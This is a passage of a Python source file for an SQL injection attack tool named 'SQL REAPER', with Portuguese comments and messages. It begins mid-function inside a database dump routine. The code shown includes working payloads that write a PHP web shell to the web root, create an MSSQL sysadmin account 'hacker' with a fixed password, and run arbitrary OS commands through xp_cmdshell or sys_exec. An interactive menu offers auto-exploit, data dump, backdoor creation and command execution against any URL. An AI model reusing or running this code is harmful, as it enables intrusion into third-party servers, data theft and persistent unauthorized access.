            soup = BeautifulSoup(response.text, 'html.parser')
            data = soup.get_text()
            
            database_dump[table] = {
                'columns': columns,
                'data': data[:10000]  # Limita a 10.000 caracteres por tabela
            }
            
            self.terminal.print_status(f"Dados extraídos da tabela {table}: {len(data)} caracteres", "success")
        
        # Salva o dump em um arquivo
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        dump_file = f"dumps/dump_{timestamp}.json"
        
        with open(dump_file, 'w') as f:
            json.dump(database_dump, f, indent=2)
        
        self.terminal.print_status(f"Dump completo salvo em: {dump_file}", "success")
        return dump_file
    
    def create_backdoor(self, url, param):
        """Cria uma backdoor persistente no servidor"""
        self.terminal.print_status("Iniciando criação de backdoor...", "warning")
        self.terminal.play_sound('backdoor')
        
        parsed = urlparse(url)
        query = parse_qs(parsed.query)
        original_value = query[param][0]
        
        if not self.db_type:
            self.terminal.print_status("Tipo de banco de dados desconhecido. Execute um scan primeiro.", "error")
            return False
        
        # Tenta diferentes técnicas de backdoor baseadas no tipo de banco
        success = False
        
        if self.db_type == 'MySQL':
            # Tenta criar um arquivo PHP
            payload = f"'; SELECT \"<?php system($_GET['cmd']); ?>\" INTO OUTFILE '/var/www/html/shell.php'--"
            target_url = self.prepare_url(url, param, original_value + payload)
            
            try:
                response = self.session.get(target_url)
                if response.status_code == 200:
                    # Verifica se o arquivo foi criado
                    check_url = url.replace(parsed.path, '/shell.php')
                    check_response = self.session.get(check_url)
                    
                    if check_response.status_code == 200:
                        success = True
                        self.terminal.print_status(f"Backdoor criada com sucesso em: {check_url}?cmd=whoami", "success")
                    else:
                        self.terminal.print_status("Falha ao verificar backdoor. Pasta pode não ter permissão de escrita.", "error")
                else:
                    self.terminal.print_status("Falha ao criar backdoor. Permissões insuficientes.", "error")
            except:
                self.terminal.print_status("Erro ao tentar criar backdoor", "error")
        
        elif self.db_type == 'MSSQL':
            # Tenta criar um usuário administrador
            payload = f"'; EXEC sp_addlogin 'hacker', 'P@ssw0rd123'; EXEC sp_addsrvrolemember 'hacker', 'sysadmin'--"
            target_url = self.prepare_url(url, param, original_value + payload)
            
            try:
                response = self.session.get(target_url)
                if response.status_code == 200:
                    success = True
                    self.terminal.print_status("Usuário administrador 'hacker' com senha 'P@ssw0rd123' criado com sucesso", "success")
                else:
                    self.terminal.print_status("Falha ao criar usuário administrador. Permissões insuficientes.", "error")
            except:
                self.terminal.print_status("Erro ao tentar criar usuário administrador", "error")
        
        else:
            self.terminal.print_status(f"Criação de backdoor automática não suportada para {self.db_type}", "error")
        
        return success
    
    def execute_system_command(self, url, param, command):
        """Executa comandos no sistema operacional"""
        self.terminal.print_status(f"Tentando executar comando: {command}", "warning")
        
        parsed = urlparse(url)
        query = parse_qs(parsed.query)
        original_value = query[param][0]
        
        if not self.db_type:
            self.terminal.print_status("Tipo de banco de dados desconhecido. Execute um scan primeiro.", "error")
            return None
        
        # Prepara o comando baseado no tipo de banco
        if self.db_type == 'MySQL':
            # Tenta usando INTO OUTFILE para criar um script e executá-lo
            temp_file = f"/tmp/cmd_{random.randint(1000,9999)}.sh"
            payload = f"'; SELECT \"#!/bin/sh\\n{command}\" INTO OUTFILE '{temp_file}'--"
            target_url = self.prepare_url(url, param, original_value + payload)
            
            try:
                response = self.session.get(target_url)
                if response.status_code == 200:
                    # Tenta executar o script
                    exec_payload = f"'; SELECT sys_exec('chmod +x {temp_file} && {temp_file}')--"
                    exec_url = self.prepare_url(url, param, original_value + exec_payload)
                    exec_response = self.session.get(exec_url)
                    
                    if exec_response.status_code == 200:
                        self.terminal.print_status(f"Comando executado (via {temp_file})", "success")
                        return exec_response.text
            except:
                pass
            
            # Se não funcionar, tenta com lib_mysqludf_sys (se disponível)
            payload = f"'; SELECT sys_exec('{command}')--"
        
        elif self.db_type == 'MSSQL':
            payload = f"'; EXEC xp_cmdshell '{command}'--"
        else:
            self.terminal.print_status(f"Execução de comandos não suportada para {self.db_type}", "error")
            return None
        
        target_url = self.prepare_url(url, param, original_value + payload)
        
        try:
            response = self.session.get(target_url)
            if response.status_code == 200:
                self.terminal.print_status("Comando executado com sucesso", "success")
                return response.text
            else:
                self.terminal.print_status("Falha ao executar comando. Permissões insuficientes.", "error")
                return None
        except Exception as e:
            self.terminal.print_status(f"Erro ao executar comando: {e}", "error")
            return None
    
    def generate_html_report(self, vulnerabilities, filename=None):
        if not filename:
            filename = f"reports/report_{int(time.time())}.html"
        else:
            filename = f"reports/{filename}"
        
        try:
            with open(filename, 'w', encoding='utf-8') as f:
                f.write("""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>SQL REAPER - Relatório de Vulnerabilidades</title>
    <style>
        body {
            font-family: 'Courier New', monospace;
            background-color: #0a0a0a;
            color: #00ff00;
            margin: 0;
            padding: 20px;
        }
        .container {
            max-width: 1200px;
            margin: 0 auto;
        }
        h1 {
            color: #ff00ff;
            text-align: center;
            border-bottom: 1px solid #00ff00;
            padding-bottom: 10px;
        }
        .vulnerability {
            background-color: #111;
            border: 1px solid #333;
            border-radius: 5px;
            padding: 15px;
            margin-bottom: 20px;
        }
        .vulnerability h2 {
            color: #ff5555;
            margin-top: 0;
        }
        .payload {
            background-color: #222;
            padding: 10px;
            border-radius: 3px;
            overflow-x: auto;
        }
        .screenshot {
            max-width: 100%;
            border: 1px solid #444;
            margin-top: 10px;
        }
        .info-label {
            color: #55ffff;
            font-weight: bold;
        }
        .success {
            color: #55ff55;
        }
        .warning {
            color: #ffff55;
        }
        .danger {
            color: #ff5555;
        }
        pre {
            margin: 0;
            white-space: pre-wrap;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>SQL REAPER - Relatório de Vulnerabilidades</h1>
                """)
                
                f.write(f"""
        <p><span class="info-label">Data do Scan:</span> {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
        <p><span class="info-label">Total de Vulnerabilidades Encontradas:</span> {len(vulnerabilities)}</p>
                """)
                
                if self.db_type:
                    f.write(f"""
        <p><span class="info-label">Banco de dados detectado:</span> {self.db_type}</p>
                    """)
                
                if self.waf_detected:
                    f.write(f"""
        <p><span class="info-label">WAF Detectado:</span> {self.waf_detected}</p>
                    """)
                
                for i, vuln in enumerate(vulnerabilities, 1):
                    f.write(f"""
        <div class="vulnerability">
            <h2>Vulnerabilidade #{i}: {vuln['type']}</h2>
            <p><span class="info-label">Parâmetro:</span> {html.escape(str(vuln['param']))}</p>
            <p><span class="info-label">Tipo de Banco de Dados:</span> {html.escape(str(vuln.get('db_type', 'Desconhecido')))}</p>
            <p><span class="info-label">WAF:</span> {html.escape(str(vuln.get('waf', 'Não detectado')))}</p>
            <p><span class="info-label">Payload:</span></p>
            <div class="payload">
                <pre>{html.escape(str(vuln['payload']))}</pre>
            </div>
            <p><span class="info-label">Tempo de Resposta:</span> {vuln['response_time']:.2f} segundos</p>
            <p><span class="info-label">Código de Status:</span> {vuln['status_code']}</p>
            <p><span class="info-label">Tamanho da Resposta:</span> {vuln['response_length']} bytes</p>
                    """)
                    
                    if 'screenshot' in vuln:
                        f.write(f"""
            <p><span class="info-label">Screenshot:</span></p>
            <img src="../{vuln['screenshot']}" alt="Screenshot da vulnerabilidade" class="screenshot">
                        """)
                    
                    if 'video' in vuln:
                        f.write(f"""
            <p><span class="info-label">Vídeo do Exploit:</span> {vuln['video']}</p>
                        """)
                    
                    if 'data' in vuln:
                        f.write(f"""
            <p><span class="info-label">Dados Extraídos:</span></p>
            <div class="payload">
                <pre>{html.escape(str(vuln['data']))}</pre>
            </div>
                        """)
                    
                    f.write("""
        </div>
                    """)
                
                f.write("""
    </div>
</body>
</html>
                """)
            
            self.terminal.print_status(f"Relatório HTML gerado: {filename}", "success")
            return filename
        except Exception as e:
            self.terminal.print_status(f"Erro ao gerar relatório HTML: {e}", "error")
            return None

def interactive_menu(scanner):
    while True:
        try:
            option = input("\nOpção: ").strip()
            
            if option == '1':  # Scan completo
                url = input("URL para scan (ex: http://site.com/page.php?id=1): ").strip()
                if not url.startswith(('http://', 'https://')):
                    scanner.terminal.print_status("URL deve começar com http:// ou https://", "error")
                    continue
                
                vulnerabilities = scanner.scan_url(url)
                
                if vulnerabilities:
                    report_file = scanner.generate_html_report(vulnerabilities)
                    scanner.terminal.print_status(f"Scan completo. Vulnerabilidades encontradas: {len(vulnerabilities)}", "success")
                    scanner.terminal.print_status(f"Relatório salvo em: {report_file}", "info")
                else:
                    scanner.terminal.print_status("Nenhuma vulnerabilidade encontrada", "warning")
            
            elif option == '2':  # Teste de parâmetro específico
                url = input("URL com parâmetro (ex: http://site.com/page.php?id=1): ").strip()
                param = input("Parâmetro para testar (ex: id): ").strip()
                
                if not url or not param:
                    scanner.terminal.print_status("URL e parâmetro são obrigatórios", "error")
                    continue
                
                payloads = PayloadFactory.get_payloads(scanner.db_type, risk=scanner.config.risk)['generic']
                vulnerabilities = scanner.test_sql_injection(url, param, '1', payloads)
                
                if vulnerabilities:
                    scanner.terminal.print_status(f"Vulnerabilidades encontradas no parâmetro {param}", "success")
                else:
                    scanner.terminal.print_status(f"Nenhuma vulnerabilidade encontrada no parâmetro {param}", "warning")
            
            elif option == '3':  # Modo avançado
                url = input("URL para teste avançado: ").strip()
                param = input("Parâmetro para testar: ").strip()
                
                if not scanner.db_type:
                    scanner.terminal.print_status("Primeiro execute um scan básico para detectar o tipo de banco de dados", "warning")
                    continue
                
                payloads = PayloadFactory.get_payloads(scanner.db_type, risk=scanner.config.risk)['db_specific']
                vulnerabilities = scanner.test_sql_injection(url, param, '1', payloads)
                
                if vulnerabilities:
                    scanner.terminal.print_status(f"Vulnerabilidades avançadas encontradas no parâmetro {param}", "success")
                else:
                    scanner.terminal.print_status(f"Nenhuma vulnerabilidade avançada encontrada no parâmetro {param}", "warning")
            
            elif option == '4':  # Auto-exploit
                if not scanner.results:
                    scanner.terminal.print_status("Primeiro execute um scan para encontrar vulnerabilidades", "warning")
                    continue
                
                scanner.terminal.print_status("Vulnerabilidades disponíveis para exploit:", "info")
                for i, vuln in enumerate(scanner.results, 1):
                    print(f" [{i}] {vuln['param']} - {vuln['payload'][:50]}...")
                
                choice = input("Selecione a vulnerabilidade para explorar: ").strip()
                try:
                    choice = int(choice) - 1
                    if 0 <= choice < len(scanner.results):
                        vuln = scanner.results[choice]
                        exploits = scanner.auto_exploit(vuln['url'], vuln['param'], vuln['payload'])
                        
                        if exploits:
                            scanner.terminal.print_status(f"Exploit realizado com sucesso. Dados extraídos: {len(exploits)}", "success")
                            for exploit in exploits:
                                print(f"\n[+] {exploit['query']}: {exploit.get('data', exploit.get('response_time', 'N/A'))}")
                        else:
                            scanner.terminal.print_status("Exploit não foi bem-sucedido", "error")
                    else:
                        scanner.terminal.print_status("Seleção inválida", "error")
                except ValueError:
                    scanner.terminal.print_status("Digite um número válido", "error")
            
            elif option == '5':  # Dump de banco de dados
                if not scanner.results:
                    scanner.terminal.print_status("Primeiro execute um scan para encontrar vulnerabilidades", "warning")
                    continue
                
                scanner.terminal.print_status("Vulnerabilidades disponíveis para dump:", "info")
                for i, vuln in enumerate(scanner.results, 1):
                    print(f" [{i}] {vuln['param']} - {vuln['payload'][:50]}...")
                
                choice = input("Selecione a vulnerabilidade para dump: ").strip()
                try:
                    choice = int(choice) - 1
                    if 0 <= choice < len(scanner.results):
                        vuln = scanner.results[choice]
                        dump_file = scanner.dump_database(vuln['url'], vuln['param'])
                        
                        if dump_file:
                            scanner.terminal.print_status(f"Dump completo salvo em: {dump_file}", "success")
                        else:
                            scanner.terminal.print_status("Falha ao realizar dump do banco de dados", "error")
                    else:
                        scanner.terminal.print_status("Seleção inválida", "error")
                except ValueError:
                    scanner.terminal.print_status("Digite um número válido", "error")
            
            elif option == '6':  # Criar backdoor
                if not scanner.results:
                    scanner.terminal.print_status("Primeiro execute um scan para encontrar vulnerabilidades", "warning")
                    continue
                
                scanner.terminal.print_status("Vulnerabilidades disponíveis para backdoor:", "info")
                for i, vuln in enumerate(scanner.results, 1):
                    print(f" [{i}] {vuln['param']} - {vuln['payload'][:50]}...")
                
                choice = input("Selecione a vulnerabilidade para backdoor: ").strip()
                try:
                    choice = int(choice) - 1
                    if 0 <= choice < len(scanner.results):
                        vuln = scanner.results[choice]
                        success = scanner.create_backdoor(vuln['url'], vuln['param'])
                        
                        if not success:
                            scanner.terminal.print_status("Falha ao criar backdoor", "error")
                    else:
                        scanner.terminal.print_status("Seleção inválida", "error")
                except ValueError:
                    scanner.terminal.print_status("Digite um número válido", "error")
            
            elif option == '7':  # Executar comandos
                if not scanner.results:
                    scanner.terminal.print_status("Primeiro execute um scan para encontrar vulnerabilidades", "warning")
                    continue
                
                scanner.terminal.print_status("Vulnerabilidades disponíveis para execução:", "info")
                for i, vuln in enumerate(scanner.results, 1):
                    print(f" [{i}] {vuln['param']} - {vuln['payload'][:50]}...")
                
                choice = input("Selecione a vulnerabilidade para execução: ").strip()
                try:
                    choice = int(choice) - 1
                    if 0 <= choice < len(scanner.results):
                        vuln = scanner.results[choice]
                        command = input("Comando para executar: ").strip()
                        
                        if command:
                            result = scanner.execute_system_command(vuln['url'], vuln['param'], command)
                            if result:
                                print(f"\nResultado:\n{result}")
                        else:
                            scanner.terminal.print_status("Comando não pode ser vazio", "error")
                    else:
                        scanner.terminal.print_status("Seleção inválida", "error")
                except ValueError:
                    scanner.terminal.print_status("Digite um número válido", "error")
            
            elif option == '8':  # Configurações
                print("\nConfigurações atuais:")
                print(f" [1] Tema: {scanner.terminal.theme}")
                print(f" [2] Som: {'Ativado' if scanner.terminal.sound else 'Desativado'}")
                print(f" [3] Modo Stealth: {'Ativado' if scanner.terminal.stealth else 'Desativado'}")
                print(f" [4] Nível de Risco: {scanner.config.risk}")
                print(" [5] Voltar")
                
                config_opt = input("Opção de configuração: ").strip()
                
                if config_opt == '1':
                    themes = list(HackerConfig.THEMES.keys())
                    print("\nTemas disponíveis:")
                    for i, theme in enumerate(themes, 1):
                        print(f" [{i}] {theme}")
                    
                    theme_opt = input("Selecione o tema: ").strip()
                    try:
                        theme_opt = int(theme_opt) - 1
                        if 0 <= theme_opt < len(themes):
                            scanner.terminal.theme = themes[theme_opt]
                            scanner.terminal.colors = HackerConfig.THEMES[scanner.terminal.theme]
                            scanner.terminal.print_status(f"Tema alterado para: {themes[theme_opt]}", "success")
                        else:
                            scanner.terminal.print_status("Seleção inválida", "error")
                    except ValueError:
                        scanner.terminal.print_status("Digite um número válido", "error")
                
                elif config_opt == '2':
                    scanner.terminal.sound = not scanner.terminal.sound
                    status = "ativado" if scanner.terminal.sound else "desativado"
                    scanner.terminal.print_status(f"Som {status}", "success")
                
                elif config_opt == '3':
                    scanner.terminal.stealth = not scanner.terminal.stealth
                    status = "ativado" if scanner.terminal.stealth else "desativado"
                    scanner.terminal.print_status(f"Modo stealth {status}", "success")
                
                elif config_opt == '4':
                    print("\nNíveis de risco:")
                    print(" [1] Baixo - Apenas detecção")
                    print(" [2] Médio - Extração de dados")
                    print(" [3] Alto - Execução de comandos")
                    
                    risk_opt = input("Selecione o nível de risco: ").strip()
                    try:
                        risk_opt = int(risk_opt)
                        if 1 <= risk_opt <= 3:
                            scanner.config.risk = risk_opt
                            scanner.terminal.print_status(f"Nível de risco definido para: {risk_opt}", "success")
                        else:
                            scanner.terminal.print_status("Seleção inválida", "error")
                    except ValueError:
                        scanner.terminal.print_status("Digite um número válido", "error")
            
            elif option == '9':  # Sair
                scanner.terminal.print_status("Saindo do SQL REAPER...", "info")
                break
            
            else:
                scanner.terminal.print_status("Opção inválida", "error")
        
        except KeyboardInterrupt:
            scanner.terminal.print_status("\nOperação cancelada pelo usuário", "error")
            continue
        except Exception as e:
            scanner.terminal.print_status(f"Erro: {e}", "error")
            continue

def main():
    parser = argparse.ArgumentParser(description='SQL REAPER - Scanner de Vulnerabilidades Avançado')
    parser.add_argument('--url', help='URL para testar')
    parser.add_argument('--param', help='Parâmetro específico para testar')
    parser.add_argument('--stealth', action='store_true', help='Modo stealth (sem banner/animations)')
    parser.add_argument('--theme', choices=['cyberpunk', 'dracula', 'matrix'], default='matrix', help='Tema visual')
    parser.add_argument('--sound', action='store_true', help='Ativar efeitos sonoros')
    parser.add_argument('--banner-text', help='Texto personalizado para o banner')
    parser.add_argument('--risk', type=int, choices=[1, 2, 3], default=1, help='Nível de risco para payloads')
    parser.add_argument('--output', help='Nome do arquivo de saída para o relatório')
    args = parser.parse_args()
    
    scanner = EliteScanner(args)
    scanner.terminal.start_animation()
    
    try:
        if not args.stealth:
            scanner.terminal.print_banner()
        
        if args.url:
            # Modo não interativo
            vulnerabilities = scanner.scan_url(args.url)
            
            if args.param:
                payloads = PayloadFactory.get_payloads(scanner.db_type, risk=args.risk)
                if args.risk == 1:
                    payloads = payloads['generic']
                elif args.risk == 2:
                    payloads = payloads['generic'] + payloads.get('data_dump', [])
                else:
                    payloads = payloads['generic'] + payloads.get('data_dump', []) + payloads.get('system', []) + payloads.get('os_command', [])
                
                param_vulns = scanner.test_sql_injection(args.url, args.param, '1', payloads)
                vulnerabilities.extend(param_vulns)
            
            if vulnerabilities:
                report_file = scanner.generate_html_report(vulnerabilities, args.output)
                scanner.terminal.print_status(f"Scan completo. Vulnerabilidades encontradas: {len(vulnerabilities)}", "success")
                if report_file:
                    scanner.terminal.print_status(f"Relatório salvo em: {report_file}", "info")
            else:
                scanner.terminal.print_status("Nenhuma vulnerabilidade encontrada", "warning")
        else:
            # Modo interativo
            interactive_menu(scanner)
        
    except KeyboardInterrupt:
        scanner.terminal.print_status("\nScan interrompido pelo usuário", "error")
    except Exception as e:
        scanner.terminal.print_status(f"Erro fatal: {e}", "error")
    finally:
        scanner.terminal.stop_animations()

if __name__ == "__main__":
    main()
